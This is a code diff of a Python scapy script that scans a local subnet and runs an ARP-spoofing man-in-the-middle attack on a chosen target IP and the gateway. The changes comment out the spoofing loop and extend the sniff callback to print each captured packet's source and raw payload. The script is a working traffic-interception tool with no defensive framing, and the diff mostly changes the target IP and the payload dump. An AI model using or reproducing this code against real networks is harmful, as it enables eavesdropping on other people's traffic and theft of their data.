@@ -40,8 +40,10 @@ def get_mac(ip):
 def action(packet):
    # pakt[iter]=packet
     #print(pakt[iter])
-    print("1")
-
+    
+    print("7")
+    print(packet.src)
+    print(packet.getlayer(scapy.packet.Raw).load)
     
 
 def spoof(target_ip, spoof_ip):
@@ -61,13 +63,13 @@ def restore(destination_ip, source_ip):
 src_ip = "192.168.1.0/24"
 scan_result = scan(src_ip)
 print_result(scan_result)
-target_ip = "192.168.1.165"  # Enter your target IP
+target_ip = "192.168.1.155"  # Enter your target IP
 gateway_ip = "192.168.1.1"  # Enter your gateway's IP
 try:
-    while True:
-        spoof(target_ip, gateway_ip)
-        spoof(gateway_ip, target_ip)
-        scapy.sniff(filter="ip src 192.168.1.165" ,prn=action)
+    #while True:
+        #spoof(target_ip, gateway_ip)
+        #spoof(gateway_ip, target_ip)
+        scapy.sniff( filter="ip src 192.168.1.155", prn=action)
 except KeyboardInterrupt:
     print("\nCtrl + C pressed.............Exiting")
 # try:
@@ -84,3 +86,4 @@ except KeyboardInterrupt:
 #     restore(gateway_ip, target_ip)
 #     restore(target_ip, gateway_ip)
 #     print("[+] Arp Spoof Stopped")
+#filter="ip src 192.168.1.155", 
